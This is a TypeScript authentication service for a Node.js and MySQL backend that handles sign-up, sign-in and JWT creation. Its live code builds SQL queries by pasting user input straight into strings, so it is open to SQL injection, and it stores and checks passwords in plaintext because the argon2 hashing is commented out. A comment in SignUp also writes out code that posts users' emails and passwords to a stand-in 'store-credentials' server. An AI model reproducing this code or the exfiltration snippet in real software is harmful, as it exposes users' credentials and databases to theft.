import  {Container, Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import { Db } from 'mysql';
// import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import mysqlLoader from '../loaders/mysql';
import { resolve } from 'path';

@Service()
export default class AuthService {
  constructor(
  
    // @Inject('userModel') private userModel: Models.UserModel,
    // private mailer: MailerService,
    @Inject('logger') private logger,
    // @Inject('mysql ') private mysql,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUserInputDTO; token: string }> {
    try {
      const mysql : Db  = Container.get('mysql')
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      // const mysql = await mysqlLoader();
      // this.logger.silly('Hashing password');
      // const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      // this.logger.silly('Creating user db record');
      const query = `INSERT INTO user (email,name,password) VALUES ('${userInputDTO.email}', '${userInputDTO.name}', '${userInputDTO.password}');`
       mysql.query(query, function (err, result) {
        if (err)  throw new Error('User cannot be created');
      });
      // this.logger.silly('Generating JWT');
      const token = this.generateToken(userInputDTO.email);
      // this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      // this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      // Reflect.deleteProperty(user, 'password');
      // Reflect.deleteProperty(user, 'salt');
      return { user:userInputDTO, token };
    } catch (e) {
      // this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ user: any; token: string }> {
    const mysql : Db  = Container.get('mysql')
    const query = `SELECT * from user where email = '${email}' and password = '${password}';`
     const userData = await new Promise((resolve,reject)=>{
      mysql.query(query,(err,result)=>{
        if (err || result.length === 0)  reject(false)
        resolve(result[0])
      });
     });
     if(!userData){
      throw new Error('User not register');
     }
     const token = this.generateToken(userData);
     return { user: userData, token };
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    // this.logger.silly('Checking password');
    // const validPassword = await argon2.verify(userRecord.password, password);
      // this.logger.silly('Password is valid!');
      // this.logger.silly('Generating JWT');
     

      // Reflect.deleteProperty(user, 'password');
      // Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
     
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    console.log('username',user.name)
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    // this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        name: user.name, // We are gonna use this in the middleware 'isAuth'
        email: user.email,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret
    );
  }
}
